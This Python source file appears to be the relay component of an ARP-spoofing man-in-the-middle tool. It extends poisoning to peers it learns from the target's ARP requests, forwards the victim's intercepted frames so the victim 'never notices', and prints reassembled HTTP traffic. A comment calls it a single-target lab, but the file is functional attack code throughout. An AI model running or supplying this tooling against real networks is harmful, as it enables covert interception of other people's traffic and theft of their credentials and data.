import socket
import struct
import time

from constans import (
    ARP_REPLY,
    ARP_REQUEST,
    ETH_P_ARP,
    ETH_P_IP,
    ETH_P_IPV6,
    VERBOSE,
)
from helpers import (
    iface_ip,
    iface_netmask,
    local_ipv4_addresses,
    mac_str,
    same_subnet,
)
from inspector import HttpReassembler, handle_ipv4
from poisoner import PoisonSet


# ------------------------------- relaying ----------------------------------
def learn_from_arp(frame: bytes, poison_set: PoisonSet, own_ip: str,
                   own_ips: set, own_mask: str, target_ip: str,
                   target_mac: bytes) -> None:
    """
    If the target broadcasts "who has X?", it is about to talk to X directly.
    Poison that pair too, otherwise same-subnet traffic bypasses us.
    """
    if len(frame) < 42:
        return
    oper = struct.unpack("!H", frame[20:22])[0]
    if oper not in (ARP_REQUEST, ARP_REPLY):
        return
    sender_mac = frame[22:28]
    sender_ip = socket.inet_ntoa(frame[28:32])
    peer_ip = socket.inet_ntoa(frame[38:42])   # "who has X?" / requester of reply

    if sender_mac != target_mac and sender_ip != target_ip:
        return
    if peer_ip in ("0.0.0.0", "255.255.255.255", target_ip):
        return
    if peer_ip in own_ips:
        return
    if not same_subnet(peer_ip, own_ip, own_mask):
        return
    poison_set.learn(peer_ip)


def run_relay(sock, ifname, attacker_mac, target_ip, target_mac, gateway_mac,
              poison_set: PoisonSet, stop):
    """
    Relay every frame addressed to us and print the interesting ones.

    Order matters:
      1. learn from the target's ARP requests,
      2. relay (unfiltered, so the victim never notices),
      3. display (filtered).
    """
    own_ip = iface_ip(ifname)
    own_ips = local_ipv4_addresses()
    own_mask = iface_netmask(ifname)
    assembler = HttpReassembler()
    relayed = target_seen = 0
    last_report = time.time()

    while not stop.is_set():
        if time.time() - last_report >= 10.0:
            print("[*] %s  relayed %d, target frames %d, hosts: %s"
                  % (time.strftime("%H:%M:%S"), relayed, target_seen,
                     ", ".join(poison_set.ips()) or "-"))
            if target_seen == 0:
                print("    [!] no frame from/for the target yet. Check that")
                print("        the target is online and its MAC is %s."
                      % mac_str(target_mac))
            last_report = time.time()

        try:
            frame, _ = sock.recvfrom(65535)
        except socket.timeout:
            continue
        except OSError:
            break

        if len(frame) < 14:
            continue

        ethertype = struct.unpack("!H", frame[12:14])[0]

        # --- learn same-subnet peers from the target's ARP requests ---------
        if ethertype == ETH_P_ARP:
            learn_from_arp(frame, poison_set, own_ip, own_ips, own_mask,
                           target_ip, target_mac)
            continue

        if frame[0:6] != attacker_mac:
            continue                                  # not addressed to us
        if ethertype not in (ETH_P_IP, ETH_P_IPV6):
            continue

        direction = None
        dest_mac = None

        if ethertype == ETH_P_IP:
            ip = frame[14:]
            if len(ip) < 20 or (ip[0] >> 4) != 4:
                continue
            ip_src = socket.inet_ntoa(ip[12:16])
            ip_dst = socket.inet_ntoa(ip[16:20])

            if ip_src == target_ip or ip_dst == target_ip:
                target_seen += 1

            # (a) target -> a web server running ON THIS MACHINE.
            #     Show it; the kernel delivers it to the local server.
            #     Do NOT relay it (it is not transit traffic).
            if ip_dst in own_ips:
                if ip_src == target_ip:
                    try:
                        handle_ipv4(frame, "client -> server (local)",
                                    assembler)
                    except Exception as exc:
                        if VERBOSE:
                            print("[!] parse error: %s" % exc)
                continue

            if ip_src == target_ip:
                direction = "client -> server"
                dest_mac = poison_set.mac_for(ip_dst) or gateway_mac
            elif ip_dst == target_ip:
                direction = "server -> client"
                dest_mac = target_mac
            elif frame[6:12] == gateway_mac:
                direction = "server -> client"
                dest_mac = poison_set.mac_for(ip_dst)
                if dest_mac is None:
                    poison_set.learn(ip_dst)          # unknown client
                    continue
            else:
                direction = "client -> server"
                dest_mac = gateway_mac
        else:
            # IPv6: single-target lab, so gateway -> us means "to the target".
            if frame[6:12] == gateway_mac:
                direction = "server -> client"
                dest_mac = target_mac
            else:
                direction = "client -> server"
                dest_mac = gateway_mac

        if dest_mac is None:
            continue

        out = dest_mac + attacker_mac + frame[12:]
        try:
            sock.send(out)
        except OSError:
            pass
        relayed += 1

        if ethertype == ETH_P_IP:
            try:
                handle_ipv4(frame, direction, assembler)
            except Exception as exc:                  # never die on bad packet
                if VERBOSE:
                    print("[!] parse error: %s" % exc)
